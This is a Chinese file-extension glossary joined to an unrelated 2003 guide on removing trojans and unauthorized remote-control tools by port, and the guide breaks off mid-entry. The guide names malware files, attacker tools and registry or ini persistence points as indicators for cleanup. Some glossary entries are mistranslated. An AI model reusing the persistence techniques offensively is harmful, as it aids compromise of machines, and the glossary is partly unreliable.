MCP Metrowerks CodeWarrior工程文件 
MCR DataCAD键盘宏文件 
MCW Microsoft Word的Macintosh文档 
MDA Microsoft Access内抽入器；Microsoft Access 2.0版及其后续版本的工作组事件 
MDB Microsoft Access数据库 
MDE Microsoft Access MDE文件 
MDL 数字跟踪器音乐模块（MOD）文件；Quake模 块文件 
MDN Microsoft Access空数据库模板 
MDW Microsoft Access工作组文件 
MDZ Microsoft Access向导模板文件 
MED 音乐编辑器，OctaMED音乐模块（MOD）文件 
MER 电子表格/数据库数据交换格式；FileMaker、Excel及其他软件能识别 
MET 表示管理器元文件 
MFG Pro/ENGINEER制造文件 
MGF 在材料与几何学里的文件格式 
MHTM，MHTML MHTML文档（MIME） 
MI 杂项 
MIC Microsoft Image Composer文件 
MID MIDI音乐 
MIF Adobe FramMaker交换格式 
MIFF 与机器无关格式文件 
MIM，MIME，MME Internet邮件扩展格式的多用途文件，经常作为发送e-mail时在AOL里附件而创建的文件；在一个多区MIM文件里的文件能用WinZip或其他类似程序打开 
MLI 3D Studio的材料库格式文件 
MMF Meal Master格式；一个处方类格式；Microsoft邮件文件 
MMG 超过20/20表或集会数据文件 
MMM Microsoft多媒体电影 
MMP Mindmapor Mind Manager文件 
MN2 Descent2任务文件 
MND，MNI Mandelbort for Windows 
MNG 多映像网络图形 
MNT,MNX Microsoft FoxPro菜单文件 
MNU Visual dBASE菜单文件；Intertel Systems Interact菜单文件 
MOD Fast Tracker、Star Trekker、Noise Tracker(等等)音乐模块文件；Microsoft多计划电子表格；Amiga/PC磁道文件 
MOV QuickTime for Windows电影 
MP2 第二层MPEG音频文件 
MP3 第三层MPEG音频文件 
MPA MPEG相关文件，MIME“mpeg类型” 
MPE，MPEG，MPG MPEG动画文件 
MPP Microsoft工程文件；CAD绘图文件格式 
MPR Microsoft FoxPro菜单（已编译） 
MRI MRI扫描文件 
MSA 魔术阴影档案 
MSDL Manchester的场景描述语言 
MSG Microsoft邮件消息 
MSI Windows 安装器包 
MSN Microsoft网络文档；Descent Mission文件 
MSP Microsoft Paint（画图）位图文件；Windows Installer路径文件 
MST Windows 安装器传输文件 
MTM Multi 跟踪器音乐模块（MOD）文件 
MUL Ultima在线 
MUS 音乐 
MUS10 Mus10声音 
MVB Microsoft多媒体查看器文件 
MWP Lotus WordPro 97 Smart Master文件 
NAN Nanoscope文件(Raw Grayscale) 
NAP NAP元文件 
NCB Microsoft Developer Studio文件 
NCD Norton改变目录 
NCF NetWare命令文件；Lotus Notes内部剪切板 
NDO 3D 低多边形建模器，Nendo 
netCDF 网络公用数据表单 
NFF 中性文件格式 
NFT NetObject Fusion模板文件 
NIL Norton光标库文件（EasyIcons-兼容） 
NIST NIST Sphere声音 
NLB Oracle 7数据 
NLM NetWare可装载模块 
NLS 用于本地化的国家语言支持文件（例如，Uniscape） 
NLU Norton Live Update e-mail 触发器文件 
NOD NetObject Fusion文件 
NSF Lotus Notes数据库 
NSO NetObject Fusion文档文件 
NST Noise Tracker音乐模块（MOD）文件 
NS2 Lotus Notes数据库（第二版） 
NTF Lotus Notes数据库模板 
NTX CA-Clipper索引文件 
NWC Noteworthy Composer歌曲文件 
NWS Microsoft Outlook Express新闻消息（MIME RFC822） 
O01 台风声音文件 
OBD Microsoft Office活页夹 
OBJ 对象文件 
OBZ Microsoft Office活页夹向导 
OCX Microsoft对象链接与嵌入定制控件 
ODS Microsoft Outlook Express邮箱文件 
OFF 3D 网状物对象文件格式 
OFN Microsoft Office FileNew文件 
OFT Microsoft Outlook模板 
OKT Oktalyzer音乐模块（MOD）文件 
OLB OLE对象库 
OLE OLE对象 
OOGL 面向对象图形库 
OPL 组织者编程语言源文件――Psion/Symbian 
OPO OPL输出可执行文件 
OPT Microsoft Developer Studio文件 
OPX OPL扩展DLL（动态链接库） 
ORA Oracle 7 配置文件 
ORC Oracle 7脚本文件 
ORG Lotus Organizer 文件 
OR2 Lotus Organizer 2 文件 
OR3 Lotus Organizer 97 文件 
OSS Microsoft Office查找文件 
OST Microsoft Exchange / Outlook 离线文件 
OTL Super NoteTab 模板文件 
OUT C语言输出文件 
P3 Primavera Project Planner（工程设计器）文件 
P10 Tektronix Plot 10 绘图文件 
P65 PageMaker 6.5文件 
P7C Digital ID 文件（MIME） 
PAB Microsoft个人地址簿 
PAC SB Studio Ⅱ 包 
PAK Quake WAD文件 
PAL 压缩文件 
PART Go！Zilla部分下载文件 
PAS Pascal源代码 
PAT DataCAD Hatch模式文件；CorelDRAW模式；高级Gravis Ultrasound / Forte 技术；碎片文件 
PBD PowerBuilder动态库，作为本地DLL的一个替代物 
PBF Turtle Beach的Pinnacle 银行文件 
PBK Microsoft PhoneBook（电话簿） 
PBL 用于在PowerBuilder开发环境中的PowerBuilder动态库 
PBM 可导出位图 
PBR PowerBuilder资源 
PCD Kodak Photo-CD映像；P-Code编译器测试脚本，由Microsoft测试与Microsoft Visual测试 
PCE Maps Eudora邮箱名字的DOS文件名 
PCL Hewlett-Packard 打印机控制语言文件（打印机备用位图） 
PCM 声音文件格式；OKI MSM6376 合成芯片 PCM格式 
PCP Symantec Live Update Pro文件 
PCS PICS动画文件 
PCT Macintosh PICT绘画文件 
PCX Zsoft PC画笔位图 
PDB 3Com PalmPilot数据库文件 
PDD 可以用Paint Shop Pro或其他图像处理软件打开的图形图像 
PDF Adobe Acrobat 可导出文档格式文件（可用Web浏览器显示）；Microsoft系统管理服务器包定义文件；NetWare打印机定义文件 
PDP Broderbund的Print Shop Deluxe文件 
PDQ Patton&Patton Flowercharting PDQ Lite 文件 
PDS 摄影图像文件（该文件格式的来源不清楚） 
PF Aladdin系统对私人文件进行加密的文件 
PFA 类型1字体（ASCⅡ） 
PFB 类型1字体（二进制） 
PFC PF组件 
PFM 打印机字体尺度 
PGD 良好隐私（Pretty Good Privacy，PGP）虚拟磁盘文件 
PGL HP绘图仪绘图文件 
PGM 可输出灰度图（位图） 
PGP 用良好隐私（PGP）算法加密文件 
PH 由Microsoft帮助文件编译器产生的临时文件 
PHP，PHP3 包含有PHP脚本的HTML网页 
PHTML 包含有PHP脚本的HTML网页；由Perl分析解释的HTML 
PIC PC画图位图；Lotus图片；Macintosh PICT绘图 
PICT Macintosh PICT图形文件 
PIF 程序信息文件；IBM PIF绘图文件 
PIG LucasArts的Dark Forces WAD文件 
PIN Epic Pinball数据文件 
PIX 内置系统位图 
PJ MKS源完整性文件 
PJX，PJT Microsoft Visual FoxPro工程文件 
PKG Microsoft Developer Studio应用程序扩展（与DLL文件类似） 
PKR PGP的公用钥匙环 
PL Perl程序 
PLG 由REND386/AVRIL使用的文件格式 
PLI Oracle 7数据描述 
PLM Discorder Tracker2模块 
PLS Disorder Tracker2抽样文件；MPEG PlayList文件（由WinAmp使用） 
PLT HPGL绘图仪绘图文件；AutoCAD plot绘图文件；Gerber标志制作软件 
PM5 Pagemaker 5.0文件 
PM6 Pagemaker 6.0文件 
PNG 可移植的网络图形位图；Paint Shop Pro浏览器目录 
PNT，PNTG MacPaint图形文件 
POG Descent2 PIG文件扩展 
POL Windows NT策略文件 
POP Visual dBASE上托文件 
POT Microsoft Powerpoint模块 
POV 视频射线跟踪器暂留 
PP4 Picture Publisher 4位图 
PPA Microsoft Powerpoint内插器 
PPF Turtle Beach的Pinnacle程序文件 
PPM 可移植的象素映射位图 
PPP Parson Power Publisher；Serif PagePlus桌面出版缺省输出 
PPS Microsoft Powerpoint幻灯片放映 
PPT Microsoft Powerpoint演示文稿 
PQI PowerQuest驱动器图像文件 
PRC 3COM PalmPiltt资源（文本或程序）文件 
PRE Lotus Freelance演示文稿 
PRF Windows系统文件，Macromedia导演设置文件 
PRG dBASE Clipper和FoxPro程序源文件；WAVmaker程序 
PRJ 3D Studio（DOS）工程文件 
PRN 打印表格（用空格分隔的文本）；DataCAD Windows打印机文件 
PRP Oberson的Prospero数据转换产品保存的工程文件 
PRS Harvard Graphics for Windows演示文件 
PRT 打印格式化文件；Pro/ENGINEER元件文件 
PRV PsiMail Internet提供者模板文件 
PRZ Lotus Freelance Graphics 97文件 
PS Postscript格式化文件（PostScript打印机可读文件） 
PSB Pinnacle Sound Bank 
PSD Adobe photoshop位图文件 
PSI PSION a-Law声音文件 
PSM Protracker Studio模型格式；Epic游戏的源数据文件 
PSP Paint Shop Pro图像文件 
PST Microsoft Outlook个人文件夹文件 
PTD Pro/ENGINEER表格文件 
PTM Polytracker音乐模块（MOD）文件 
PUB Ventura Publisher出版物；Microsoft Publisher文档 
PWD Microsoft Pocket Word文档 
PWL Windows 95口令列表文件 
PWP Photoworks图像文件（能被Photoworks浏览的一系列文件） 
PWZ Microsoft Powerpoint向导 
PXL Microsoft Pocket Excel电子表格 
PY 来自Yahoo的电子消息；Python脚本文件 
PYC Python脚本文件 
QAD PF QuickArt文档 
QBW QuickBooks for Windows文件 
QDT 来自Quicken UK的QuickBooks数据文件，帐目/税/货单程序 
QD3D Apple的QuickDraw 3D元文件格式 
QFL FAMILY LAWYER文档 
QIC Microsoft备份文件 
QIF QuickTime相关图像（MIME）；Quicken导入文件 
QLB Quick库 
QM Quality Motion文件 
QRY Microsoft查询文件 
QST Quake Spy Tab文件 
QT，QTM QuickTime电影 
QTI，QTIF QuickTime相关图像 
QTP QuickTime优先文件 
QTS Mac PICT图像文件；QuickTime相关图像 
QTX QuickTime相关图像 
QW Symantec Q&A Write程序文件 
QXD Quark XPress文件 
R Pegasus邮件资源文件 
RA RealAudio声音文件 
RAM RealAudio元文件 
RAR RAR压缩档案（Eugene Roshall格式） 
RAS Sun光栅图像位图 
RAW RAW文件格式（位图）；Raw标识的PCM数据 
RBH 由RoboHELP维持的RBH文件，它加入到一个帮助工程文件的信息中 
RDF 资源描述框架文件（涉及XML和元数据） 
RDL Descent注册水平文件 
REC 录音机宏；RapidComm声音文件 
REG 注册表文件 
REP Visual dBASE报表文件 
RES Microsoft Visual C++资源文件 
RFT 可修订的表单文本（IBM的DCA一部分或文档内容框架结构一部分） 
RGB，SGI Silicon图形RGB文件 
RLE Run-Length编码的位图 
RL2 Descent2注册水平文件 
RM RealAudio视频文件 
RMD Microsoft RegMaid文档 
RMF Rich Map格式（3D游戏编辑器使用它来保存图） 
RMI M1D1音乐 
ROM 基于盒式磁带的家庭游戏仿真器文件（来自Atari 2600、Colecovision、Sega、Nintendo等盒式磁带里的ROM完全拷贝，在两个仿真器之间不可互修改） 
ROV Rescue Rover数据文件 
RPM RedHat包管理器包（用于Linux） 
RPT Microsoft Visual Basic Crystal报表文件 
RRS Ace game Road Rash保存的文件 
RSL Borland的Paradox 7报表 
RSM WinWay Resume Writer恢复文件 
RTF Rich Text格式文档 
RTK RoboHELP使用的用来模拟Windows帮助的搜索功能 
RTM Real Tracker音乐模块（MOD）文件 
RTS RealAudio的RTSL文档；RoboHELP对复杂操作进行加速 
RUL InstallShield使用的扩展名 
RVP Microsoft Scan配置文件（MIME） 
Rxx 多卷档案上的RAR压缩文件（xx= 1～99间的一个数字） 
S 汇编源代码文件 
S3I Scream Tracker v3设备 
S3M Scream Tracker v3的声音模块文件 
SAM Ami专业文档；8位抽样数据 
SAV 游戏保存文件 
SB 原始带符号字节（8位）数据 
SBK Creative Labs的Soundfont 1.0 Bank文件；(Soundblaster)/EMU SonndFont v1.x Bank文件 
SBL Shockwave Flash对象文件 
SC2 Microsoft Schedule+7文件格式；SAS目录（Windows 95/NT、OS/2、Mac） 
SC3 SimCity 3000保存的游戏文件 
SCC Microsoft Source Safe文件 
SCD Matrix/Imapro SCODL幻灯片图像；Microsoft Schedule +7 
SCF Windows Explorer命令文件 
SCH Microsoft Schedule+1 
SCI ScanVec Inspire本地文件格式 
SCN True Space 2场景文件 
SCP 拨号网络脚本文件 
SCR Windows屏幕保护；传真图像；脚本文件 
SCT SAS目录（DOS）；Scitex CT位图；Microsoft FoxPro表单 
SCT01 SAS目录（UNIX） 
SCV ScanVec CASmate本地文件格式 
SCX Microsoft FoxPro表单文件 
SD Sound Designer 1声音文件 
SD2 Sound Designer 2展平文件/数据分叉指令；SAS数据库（Windows 95/NT、OS/2、Mac） 
SDF 系统数据文件格式―Legacy Unisys（Sperry）格式 
SDK Roland S―系列软盘映像 
SDL Smart Draw库文件 
SDR Smart Draw绘图文件 
SDS 原始Midi抽样转储标准文件 
SDT SmartDraw模板 
SDV 分号分隔的值文件 
SDW Lotus WordPro图形文件；原始带符号的DWORD（32位）数据 
SDX 由SDX压缩的Midi抽样转储标准文件 
SEA 自解压档案（Stufflt for Macintosh或其他软件使用的文件） 
SEP 标签图像文件格式（TIFF）位图 
SES Cool Edit Session文件（普通数据声音编辑器文件） 
SF IRCAM声音文件格式 
SF2 Emu Soundfont v2.0文件；Creative Labs的Soundfont 2.0 Bank文件（Sound Blaster） 
SFD SoundStage声音文件数据 
SFI Sound Stage声音文件信息 
SFR Sonic Foundry Sample资源 
SFW Seattle电影工程（损坏的JPEG） 
SFX RAR自解压档案 
SGML 标准通用标签语言 
SHB Corel Show演示文稿；文档快捷文件 
SHG 热点位图 
SHP 3D Studio（DOS）形状文件；被一些应用程序用于多部分交互三角形模型的3D建模 
SHS Shell scrap文件；据载用于发送“口令盗窃者” 
SHTML 含有服务器端包括（SSI）的HTML文件 
SHW Corel Show演示文稿 
SIG 符号文件 
SIT Mac的StuffIt档案文件 
SIZ Oracle 7配置文件 
SKA PGP秘钥 
SKL Macromedia导演者资源文件 
SL PACT的保存布局扩展名 
SLB Autodesk Slide库文件格式 
SLD Autodesk Slide文件格式 
SLK Symbolic Link（SYLK）电子表格 
SM3 DataCAD标志文件 
SMP Samplevision格式；Ad Lib Gold抽样文件 
SND NeXT声音；Mac声音资源；原始的未符号化的PCM数据；AKAI MPC系列抽样文件 
SNDR Sounder声音文件 
SNDT Sndtool声音文件 
SOU SB Studio Ⅱ声音 
SPD Speech数据文件 
SPL Shockwave Flash对象；DigiTrakker抽样 
SPPACK SPPack声音抽样 
SPRITE Acorn的位图格式 
SQC 结构化查询语言（SQR）普通代码文件 
SQL InFORMix SQL查询；通常被数据库产品用于SQL查询（脚本、文本、二进制）的文件扩展名 
SQR 结构化查询语言（SQR）程序文件 
SSDO1 SAS数据集合（UNIX） 
SSD SAS数据库（DOS） 
SSF 可用的电子表格文件 
ST Atari ST磁盘映像 
STL Sterolithography文件 
STM .shtml的短后缀形式，含有一个服务端包括（SSI）的HTML文件；Scream Tracker V2音乐模块（MOD）文件 
STR 屏幕保护文件 
STY Ventura Publisher风格表 
SVX Amiga 8SVX声音；互交换文件格式，8SVX/16SV 
SW 原始带符号字（16位）数据 
SWA 在Macromedia导演文件（MP3文件）中的Shockwave声音文件 
SWF Shockwave Flash对象 
SWP DataCAD交换文件 
SYS 系统文件 
SYW Yamaha SY系列波形文件 
T64 Commodore 64仿真器磁带映像文件 
TAB Guitar表文件 
TAR 磁带档案 
TAZ UNIX gzip/tape档案 
TBK Asymetrix Toolbook交互多媒体文件 
TCL 用TCL/TK语言编写的脚本 
TDB Thumbs Plus数据库 
TDDD Imagine 和 Turbo Silver射线跟踪器使用的文件格式 
TEX 正文文件 
TGA Targa位图 
TGZ UNIX gzip/tap档案文件 
THEME Windows 95桌面主题文件 
THN Graphics WorkShop for Windows速写 
TIF，TIFF 标签图像文件格式（TIFF）位图 
TIG 虎形文件，美国政府用于分发地图 
TLB OLE类型库 
TLE 两线元素集合（NASA） 
TMP Windows临时文件 
TOC Eudora邮箱内容表 
TOL Kodak照片增强器 
TOS Atari 16/32和32/32计算机操作系统文件 
TPL CakeWalk声音模板文件；DataCAD模板文件 
TPP Teleport Pro工程 
TRK Kermit脚本文件 
TRM 终端文件 
TRN MKS源完整性工程用法日志文件 
TTF TrueType字体文件 
TTK Corel Catalyst Translaton Tool Kit 
TWF TabWorks文件 
TWW Tagwrite模板 
TX8 MS-DOS文本 
TXB Descent/D2编码概要文件 
TXT ASCⅡ文本格式的声音数据 
TXW Yamaha TX16W波形文件 
TZ 老的压缩格式文件 
T2T Sonate CAD建模软件文件 
UB 原始未符号化的字节（8位）数据 
UDF Windows NT/2000唯一性数据库文件 
UDW 原始未符号化的双字（32位）数据 
ULAW 美国电话格式（CCITT G.711）声音 
ULT Ultra Tracker音乐模块（MOD）文件 
UNI MikMod UniMod格式化文件 
URL Internet快捷方式文件 
USE MKS源完整性文件 
UU，UUE UU编码文件 
UW 原始未符号化字（16位）数据 
UWF UltraTracker波形文件 
V8 Covox 8位声音文件 
VAP 加注讲演文件 
VBA VBase文件 
VBP Microsoft Visual Basic工程文件 
VBW Microsoft Visual Basic工作区文件 
VBX Microsoft Visual Basic用户定制控件 
VCE Natural MicroSystems（NMS）未格式化声音文件（由Cool Edit使用） 
VCF 虚拟卡文件（Netscape）；Veri配置文件；为与Sense8的WordToolkit一起使用而定义对象 
VCT，VCX Microsoft FoxPro类库 
VDA Targa位图 
VI National Instruments LABView产品的虚拟设备文件 
VIFF Khoros Visualisation格式 
VIR Norton Anti-Virus或其他杀毒产品用于标识被病毒感染的文件 
VIV VivoActive Player流视频文件 
VIZ Division的dVS/dVISE文件 
VLB CorelVentura库 
VMF FaxWorks声音文件 
VOC Creative Labs的Sound Blaster声音文件 
VOX 用ADPCM编码的对话声音文件；Natural MicroSystems（NMS）格式化声音文件，Talking Technology声音文件 
VP Ventura Publisher出版物 
VQE，VQL Yamaha Sound-VQ定位器文件 
VQF Yamaha Sound-VQ文件（可能出现标准） 
VRF Oracle 7配置文件 
VRML 虚拟现实建模语言文件 
VSD Visio绘画文件（流程图或图解） 
VSL 下载列表文件（GetRight） 
VSN Windows 9x/NT Virusafe版文件，用于保持有关目录中所有信息，当一个文件被访问，其中信息与VSN信息进行比较，以确保它们保持一致 
VSS Visio模板文件 
VST Targa位图 
VSW Visio工作区文件 
VXD Microsoft Windows虚拟设备驱动程序 
W3L W3Launch文件 
WAB Microsoft Outlook文件 
WAD 包含有视频、玩家水平和其他信息的DOOM游戏的大文件 
WAL Quake 2正文文件 
WAV Windows波形声形 
WB1，WB2 QuattoPro for Windows电子表格 
WBK Microsoft Word备份文件 
WBL Argo WebLoadⅡ上载文件 
WBR Crick Software的WordBar文件 
WBT Crick Software的WordBar模板 
WCM WordPerfect宏 
WDB Microsoft Works数据库 
WDG War FTP远程守护者文件 
WEB CorelXARA Web文档 
WFB Turtle Beach的Wavefont Bank（Maui/Rio/Monterey） 
WFD Turtle Beach的Wavefont Drum集合（Maui/Rio/Monterey） 
WFM Visual dBASE Windows表单 
WFN 在CorelDRAW中使用的符号 
WFP Turtle Beach的Wavefont程序（Maui/Ri/Monterey） 
WGP Wild Board游戏数据文件 
WID Ventura宽度表 
WIL WinImage文件 
WIZ Microsoft Word向导 
WK1 Lotus 1-2-3版第1、2版的电子表格 
WK3 Lotus 1-2-3版第3版的电子表格 
WK4 Lotus 1-2-3版第4版的电子表格 
WKS Lotus 1-2-3电子表格；Microsoft Works文档 
WLD REND386/AVRIL文件 
WLF Argo WebLoadⅠ上载文件 
WLL Microsoft Word内插器 
WMF Windows元文件 
WOW Grave Composer音乐模块（MOD）文件 
WP WordPerfect文档 
WP4 WordPerfect 4文档 
WP5 WordPerfect 5文档 
WP6 WordPerfect 6文档 
WPD WordPerfect文档或演示 
WPF 可字处理文档 
WPG WordPerfect图形 
WPS Microsoft Works文档 
WPT WordPerfect模板 
WPW Novell PerfectWorks文档 
WQ1 Quattro Pro/DOS电子表格 
WQ2 Quattro Pro/DOS第5版电子表格 
WR1 Lotus Symphony 
WRG ReGet文档 
WR1 书写器文档 
WRK Cakewalk音乐声音工程文件 
WRL 虚拟现实模型 
WRZ VRML文件对象 
WS1 WordStar for Windows 1文档 
WS2 WordStar for Windows 2文档 
WS3 WordStar for Windows 3文档 
WS4 WordStar for Windows 4文档 
WS5 WordStar for Windows 5文档 
WS6 WordStar for Windows 6文档 
WS7 WordStar for Windows 7文档 
WSD WordStar 2000文档 
WVL Wavelet压缩位图 
WWL Microsoft Word内插器文件 
X AVS图像格式 
XAR CorelXARA绘画 
XBM MIME“xbitmap”图像 
XI Scream Tracker设备抽样文件 
XIF Wang映像文件（Windows 95带有的文件） 
XLA Microsoft Excel内插器 
XLB Microsoft Excel工具条 
XLC Microsoft Excel图表 
XLD Microsoft Excel对话框 
XLK Microsoft Excel备份 
XLL Microsoft Excel内插器文件 
XLM Microsoft Excel宏 
XLS Microsoft Excel工作单 
XLT Microsoft Excel模板 
XLV Microsoft Excel VBA模块 
XLW Microsoft Excel工作簿/工作区 
XM FastTracker 2，Digital Tracker音乐模块（MOD）文件 
XNK Microsoft Exchange快捷方式文件 
XPM X位图格式 
XR1 Epic MegaGames Xargon数据文件 
XTP Xtree数据文件 
XWD X Windows转储格式 
XWF Yamaha XG Works文件（MIDI序列） 
XY3 XYWrite Ⅲ文档 
XY4 XYWrite Ⅳ文档 
XYP XYWrite Ⅲ Plus文档 
XYW XYWrite for Windows 4.0文档 
X16 宏媒体扩展（程序扩展），16位 
X32 宏媒体扩展（程序扩展），32位 
YAL Arts& Letters剪贴艺术库 
YBK Microsoft Encarta 年鉴 
Z UNIX gzip文件 
ZAP Windows软件安装配置文件 
ZIP Zip文件 
ZOO 早前版本的压缩文件 
000-999 用于为老版本（或备份）文件编号（比如：被安装程序改变的CONFIG.SYS文件）；又可用于为小范围的PC应用程序的多个用户相关数据文件编号 
12M Lotus 1-2-3 97 SmartMaster文件 
123 Lotus 1-2-3 97文件 
2D VersaCAD的2维绘画文件 
2GR，3GR 在Windows之下的VGA图形驱动程序/配置文件 
3D VersaCAD的3维绘画文件 
3DM 3D NURBS建模器，Rhino 
3DS 3D Studio（DOS下）格式文件 
386 在386或更高级处理器上使用的文件 
4GE InFORMix 4GL编译后代码 
4GL InFORMix 4GL源代码 
669 Composer 669；UNIX Composer音乐模型文件；669磁道模块 
#01 及更高的号 为计算机演示而扫描的一系列电影的图片文件编号方法 
$$$ OS/2用来跟踪档案文件 
@@@ 用于安装过程中的屏幕文件和用于Microsoft Codeview for C这样的应用程序的指导文件



【常见木马和未授权远程控制软件的关闭】
常见木马和未授权远程控制软件的关闭(2003-06-04) 
以下各种木马及未授权被安装的远程控制软件均由于您没有正确的设置您的管理员密
码造成的。请先检查系统中所有帐号的口令是否设置的足够安全。     
 
口令设置要求：
     1.口令应该不少于8个字符；
     2.不包含字典里的单词、不包括姓氏的汉语拼音；
     3.同时包含多种类型的字符，比如　　
 		o大写字母(A,B,C,..Z)
 		o小写字母(a,b,c..z)
 		o数字(0,1,2,…9)
 		o标点符号(@,#,!,$,%,& …)

注意：下文中提到的相关路径根据您的操作系统版本不同会有所不同，请根据自己的系统做
相应的调整
win98系统：          c:\windows   c:\windows\system
winnt和win2000系统： c:\winnt     c:\winnt\system32
winxp系统：          c:\windows   c:\windows\system32
根据系统安装的路径不同，目录所在盘符也可能不同，如系统安装在D盘，请将C:\windows改
为D:\windows依此类推


大部分的木马程序都可以改变默认的服务端口，我们应该根据具体的情况采取相应的措施，一
个完整的检查和删除过程如下例所示：

例：113端口木马的清除（仅适用于windows系统）：
这是一个基于irc聊天室控制的木马程序。
      1.首先使用netstat -an命令确定自己的系统上是否开放了113端口
      2.使用fport命令察看出是哪个程序在监听113端口
              例如我们用fport看到如下结果：
        Pid   Process            Port  Proto Path
        392   svchost        ->  113   TCP   C:\WINNT\system32\vhos.exe
      
        我们就可以确定在监听在113端口的木马程序是vhos.exe而该程序所在的路径为
        c:\winnt\system32下。
      3.确定了木马程序名（就是监听113端口的程序）后，在任务管理器中查找到该进程，
        并使用管理器结束该进程。
      4.在开始-运行中键入regedit运行注册表管理程序，在注册表里查找刚才找到那个程序，
        并将相关的键值全部删掉。
      5.到木马程序所在的目录下删除该木马程序。（通常木马还会包括其他一些程序，如
        rscan.exe、psexec.exe、ipcpass.dic、ipcscan.txt等，根据
        木马程序不同，文件也有所不同，你可以通过察看程序的生成和修改的时间来确定与
        监听113端口的木马程序有关的其他程序）
      6.重新启动机器。

 以下列出的端口仅为相关木马程序默认情况下开放的端口，请根据具体情况采取相应的操作：

 707端口的关闭：
     这个端口开放表示你可能感染了nachi蠕虫病毒，该蠕虫的清除方法如下：
     1、停止服务名为WINS Client和Network Connections Sharing的两项服务
     2、删除c:\winnt\SYSTEM32\WINS\目录下的DLLHOST.EXE和SVCHOST.EXE文件
     3、编辑注册表，删除HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
        项中名为RpcTftpd和RpcPatch的两个键值
     
 1999端口的关闭：
     这个端口是木马程序BackDoor的默认服务端口，该木马清除方法如下：
     1、使用进程管理工具将notpa.exe进程结束
     2、删除c:\windows\目录下的notpa.exe程序
     3、编辑注册表，删除HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
        项中包含c:\windows\notpa.exe /o=yes的键值


 2001端口的关闭：
     这个端口是木马程序黑洞2001的默认服务端口，该木马清除方法如下：
     1、首先使用进程管理软件将进程windows.exe杀掉
     2、删除c:\winnt\system32目录下的windows.exe和S_Server.exe文件
     3、编辑注册表，删除
        HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\
        项中名为windows的键值
     4、将HKEY_CLASSES_ROOT和HKEY_LOCAL_MACHINE\Software\CLASSES项中的Winvxd项删除
     5、修改HKEY_CLASSES_ROOT\txtfile\shell\open\command
        项中的c:\winnt\system32\S_SERVER.EXE %1为C:\WINNT\NOTEPAD.EXE %1
     6、修改HKEY_LOCAL_MACHINE\Software\CLASSES\txtfile\shell\open\command
        项中的c:\winnt\system32\S_SERVER.EXE %1键值改为C:\WINNT\NOTEPAD.EXE %1

 2023端口的关闭：
     这个端口是木马程序Ripper的默认服务端口，该木马清除方法如下：
     1、使用进程管理工具结束sysrunt.exe进程
     2、删除c:\windows目录下的sysrunt.exe程序文件
     3、编辑system.ini文件，将shell=explorer.exe sysrunt.exe 改为shell=explorer.exe后保存
     4、重新启动系统

 2583端口的关闭：
     这个端口是木马程序Wincrash v2的默认服务端口，该木马清除方法如下：
     1、编辑注册表，删除HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
        项中的WinManager = "c:\windows\server.exe"键值
     2、编辑win.ini文件，将run=c:\windows\server.exe改为run=后保存退出
     3、重新启动系统后删除C:\windows\system\ SERVER.EXE

 3389端口的关闭：
     首先说明3389端口是windows的远程管理终端所开的端口，它并不是一个木马程序，请先
     确定该服务是否是你自己开放的。如果不是必须的，请关闭该服务。
 
     win2000关闭的方法：
     1、win2000server 开始-->程序-->管理工具-->服务里找到Terminal Services服务项，
        选中属性选项将启动类型改成手动，并停止该服务。
     2、win2000pro    开始-->设置-->控制面板-->管理工具-->服务里找到Terminal Services
        服务项，选中属性选项将启动类型改成手动，并停止该服务。
     winxp关闭的方法：
        在我的电脑上点右键选属性-->远程，将里面的远程协助和远程桌面两个选项框里的勾去掉。

4444端口的关闭：
     如果发现你的机器开放这个端口，可能表示你感染了msblast蠕虫，清除该蠕虫的方法如下：
     1、使用进程管理工具结束msblast.exe的进程
     2、编辑注册表，删除HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
        项中的"windows auto update"="msblast.exe"键值
     3、删除c:\winnt\system32目录下的msblast.exe文件

 
4899端口的关闭：
     首先说明4899端口是一个远程控制软件（remote administrator)服务端监听的端口，他不能
     算是一个木马程序，但是具有远程控制功能，通常杀毒软件是无法查出它来的，请先确定该服
     务是否是你自己开放并且是必需的。如果不是请关闭它。
 
     关闭4899端口：
     1、请在开始-->运行中输入cmd(98以下为command),然后 cd C:\winnt\system32(你的系统
        安装目录），输入r_server.exe /stop后按回车。
        然后在输入r_server /uninstall /silence
 
     2、到C:\winnt\system32(系统目录）下删除r_server.exe admdll.dll raddrv.dll三个文件
 
 
 5800，5900端口：
     首先说明5800，5900端口是远程控制软件VNC的默认服务端口，但是VNC在修改过后会被用在
     某些蠕虫中。
     请先确认VNC是否是你自己开放并且是必须的，如果不是请关闭

     关闭的方法：
     1、首先使用fport命令确定出监听在5800和5900端口的程序所在位置（通常会是
        c:\winnt\fonts\explorer.exe)
     2、在任务管理器中杀掉相关的进程（注意有一个是系统本身正常的，请注意！如果错杀可以重新
       运行c:\winnt\explorer.exe)
     3、删除C:\winnt\fonts\中的explorer.exe程序。
     4、删除注册表HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
        项中的Explorer键值。
     5、重新启动机器。
 
6129端口的关闭：
      首先说明6129端口是一个远程控制软件（dameware nt utilities)服务端监听得端口，他不是
      一个木马程序，但是具有远程控制功能，通常的杀毒软件是无法查出它来的。请先确定该服务
      是否是你自己安装并且是必需的，如果不是请关闭。
 
      关闭6129端口：
      1、选择开始-->设置-->控制面板-->管理工具-->服务
 	 找到DameWare Mini Remote Control项点击右键选择属性选项，将启动类型改成禁用后
 	 停止该服务。
      2、到c:\winnt\system32(系统目录）下将DWRCS.EXE程序删除。
      3、到注册表内将HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\项中的DWRCS键值删除

6267端口的关闭：
      6267端口是木马程序广外女生的默认服务端口，该木马删除方法如下：
      1、启动到安全模式下，删除c:\winnt\system32\下的DIAGFG.EXE文件
      2、到c:\winnt目录下找到regedit.exe文件，将该文件的后缀名改为.com
      3、选择开始-->运行输入regedit.com进入注册表编辑页面
      4、修改HKEY_CLASSES_ROOT\exefile\shell\open\command项的键值为"%1" %*
      5、删除HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\ CurrentVersion\RunServices
         项中名字为Diagnostic Configuration的键值
      6、将c:\winnt下的regedit.com改回到regedit.exe

6670、6771端口的关闭：
      这些端口是木马程序DeepThroat v1.0 - 3.1默认的服务端口，清除该木马的方法如下：
